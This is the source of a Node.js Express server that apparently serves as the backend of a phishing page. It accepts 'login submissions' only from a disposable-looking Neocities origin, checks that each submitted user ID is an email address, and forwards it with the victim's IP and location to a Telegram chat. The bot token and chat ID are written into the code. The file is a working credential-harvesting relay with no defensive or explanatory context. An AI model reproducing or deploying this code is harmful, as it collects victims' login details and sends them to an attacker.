// ---------------------------------------
// Required modules
// ---------------------------------------
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();

// ---------------------------------------
// Configuration
// ---------------------------------------
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8286108529:AAEBCRqZuS8E7eayAjCU0rJzfn5-v8Ogweo';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7009891691';
const ALLOWED_ORIGIN = 'https://hsr54ae5thw45ah.neocities.org';

// ---------------------------------------
// Middleware
// ---------------------------------------
app.use(express.json());
app.use(cors({
    origin: ALLOWED_ORIGIN,
    methods: ['POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type']
}));

// ---------------------------------------
// Helper function: Escape Markdown V2 for Telegram
// ---------------------------------------
function escapeMarkdownV2(text) {
    return text.replace(/[\\_*[\]()~`>#+\-=|{}.!]/g, match => '\\' + match);
}

// ---------------------------------------
// Route Handler
// ---------------------------------------
app.post('/', async (req, res) => {
    const { userID = '', ip, location = 'Unknown' } = req.body;

    const clientIP = ip?.trim() || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const trimmedUserID = userID.trim();

    // Validate input
    if (!trimmedUserID) {
        return res.status(400).json({ status: 'error', message: 'Missing userID' });
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(trimmedUserID)) {
        return res.status(400).json({ status: 'error', message: 'Invalid userID format' });
    }

    // Build the message
    const message = 
        "🔔 *New Login Submission*\n" +
        `*User ID:* \`${escapeMarkdownV2(trimmedUserID)}\`\n` +
        `*IP:* \`${escapeMarkdownV2(clientIP)}\`\n` +
        `*Location:* \`${escapeMarkdownV2(location.trim())}\``;

    // Send to Telegram
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'MarkdownV2',
            disable_web_page_preview: true
        });

        res.status(200).json({ status: 'ok', message: 'submitted' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: 'Telegram send failed' });
    }
});

// ---------------------------------------
// Handle non-POST methods
// ---------------------------------------
app.all('/', (req, res) => {
    if (req.method === 'OPTIONS') {
        return res.status(204).end(); // Preflight
    }
    res.status(405).json({ status: 'error', message: 'Only POST allowed' });
});

// ---------------------------------------
// Start Server (Optional for deployment)
// ---------------------------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
});
